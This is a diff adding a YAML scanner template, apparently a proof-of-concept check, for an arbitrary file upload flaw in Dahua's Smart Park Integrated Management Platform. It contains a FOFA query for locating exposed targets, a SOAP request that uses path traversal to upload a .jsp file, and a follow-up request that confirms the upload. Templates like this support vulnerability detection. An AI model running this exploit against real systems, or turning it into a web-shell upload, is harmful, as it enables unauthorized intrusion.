@@ -1,0 +1,27 @@
+id: poc-yaml-dahua-zhyq-integrated-management-platform-poi-anyfile-upload
+info:
+  name: 大华智慧园区综合管理平台 poi 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 大华智慧园区综合管理平台
+  fofa: body="WPMS/asset/common/js/jsencrypt.min.js"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /emap/webservice/gis/soap/poi
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n \
+    \ <soapenv:Header/>\n  <soapenv:Body>\n  <res:uploadPicFile>\n  <!--type: string-->\n\
+    \  <arg0>/../../{{.t1}}.jsp</arg0>\n  <!--type: base64Binary-->\n  <arg1>{{.t2}}</arg1>\n\
+    \  </res:uploadPicFile>\n  </soapenv:Body>\n  </soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"<code>1</code>")
+- method: GET
+  path: /upload/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t1)
+transport: http
